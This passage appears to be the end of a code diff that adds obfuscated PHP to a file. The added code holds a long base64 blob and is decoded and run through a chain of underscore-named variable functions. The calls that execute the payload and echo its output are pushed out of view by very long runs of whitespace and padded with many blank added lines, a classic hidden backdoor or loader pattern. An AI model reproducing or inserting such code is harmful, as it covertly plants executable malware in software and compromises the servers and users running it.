6/o+SF6EIZ8qxgZvzJr8g9ATVTBLrOuraleG9RNTZ5fS88+3pfqO9nzU93kNyFWoB5apLfnWtSrTZ6EXtVd8vuoZ/7IL7el0zWtA80FHGZBzBBn9f2EesOLNViJv9kZfS+RZvySe5YKPxzrI/Et8Q+y93POUaP203Nzo8zPDI58CyHX8rOCMRBv4G8pQufSgy2P97QE5w6xddDbilfOC+YTMHJydg0XkQXbG05jIcwb2vRtFNnWOnOPw9Q7rkYKc8l07ErjA/NHHnViL1DlVoYyee2YZ1mGzWezc+flXJIaInfuU8P9xOw/4B4n1S8om0FZjTPx3hw3J307UBIjOiEr0l39WmI01mtZn+MnOnmJ5c2R+WgJvtLWyqzqWtK0pdyyjsFaM1EFZTIn3/YWxsBoQ7SnQLqQBxeNqPSXaBV1EANgMn/pR/V+MBwNePrFoTdpuU7BAX/muOsRel/BRhmemLcI+z9Y7UQv3AWQb/P30+y+//Przrn/8m1x/kL//ZJ/++/cqryfeLfPiP+IO//kJ///pf6Juo5n/1y8fP3/fn1/SuPDPFPJRVPjv3/8PhuVm9g==';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
